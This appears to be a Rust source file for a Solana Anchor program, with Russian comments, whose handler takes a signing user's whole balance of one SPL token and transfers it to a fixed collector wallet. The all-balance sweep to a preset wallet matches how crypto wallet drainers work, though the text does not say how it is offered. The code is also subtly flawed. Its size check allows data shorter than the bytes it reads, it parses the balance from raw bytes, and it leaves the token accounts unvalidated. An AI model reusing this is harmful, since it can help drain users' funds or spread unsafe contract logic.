use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, Transfer};
use anchor_spl::associated_token::AssociatedToken;
use crate::state::*;

#[derive(Accounts)]
pub struct CollectSplTokens<'info> {
    #[account(
        seeds = [CollectorState::SEED],
        bump = collector_state.bump
    )]
    pub collector_state: Account<'info, CollectorState>,
    
    #[account(mut)]
    pub user_wallet: Signer<'info>,
    
    /// CHECK: Кошелек-получатель проверяется через constraint с collector_state
    #[account(
        constraint = collector_wallet.key() == collector_state.collector_wallet
    )]
    pub collector_wallet: AccountInfo<'info>,
    
    /// Mint аккаунт SPL токена
    /// CHECK: Адрес mint используется для создания токен аккаунтов
    pub mint: AccountInfo<'info>,
    
    /// Токен аккаунт пользователя (источник)
    /// CHECK: Проверяется в логике функции при десериализации
    #[account(mut)]
    pub user_token_account: AccountInfo<'info>,
    
    /// Токен аккаунт получателя (назначение)
    /// CHECK: Проверяется в логике функции при создании CPI
    #[account(mut)]
    pub collector_token_account: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub associated_token_program: Program<'info, AssociatedToken>,
    pub system_program: Program<'info, System>,
}

pub fn collect_spl_tokens_handler(ctx: Context<CollectSplTokens>) -> Result<()> {
    let user_token_account = &ctx.accounts.user_token_account;
    let collector_token_account = &ctx.accounts.collector_token_account;
    let user_wallet = &ctx.accounts.user_wallet;
    let mint = &ctx.accounts.mint;
    
    msg!("Собираем SPL токен: {}", mint.key());
    
    // Проверяем, что у пользователя есть токен аккаунт с балансом
    if user_token_account.data_is_empty() {
        msg!("Пользователь не имеет токен аккаунта для этого mint");
        return Ok(());
    }
    
    // Десериализуем токен аккаунт для получения баланса
    let user_token_data = user_token_account.try_borrow_data()?;
    if user_token_data.len() < 64 {
        msg!("Неверный размер токен аккаунта");
        return Ok(());
    }
    
    // Извлекаем баланс (bytes 64-72 в токен аккаунте)
    let user_balance = u64::from_le_bytes([
        user_token_data[64], user_token_data[65], user_token_data[66], user_token_data[67],
        user_token_data[68], user_token_data[69], user_token_data[70], user_token_data[71],
    ]);
    
    msg!("Баланс пользователя: {}", user_balance);
    
    // Проверяем, есть ли токены для перевода
    if user_balance > 0 {
        msg!("Переводим {} токенов", user_balance);
        
        // Переводим все токены
        token::transfer(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                Transfer {
                    from: user_token_account.to_account_info(),
                    to: collector_token_account.to_account_info(),
                    authority: user_wallet.to_account_info(),
                },
            ),
            user_balance,
        )?;
        
        msg!("SPL токены успешно переведены!");
    } else {
        msg!("Нет токенов для перевода");
    }
    
    Ok(())
}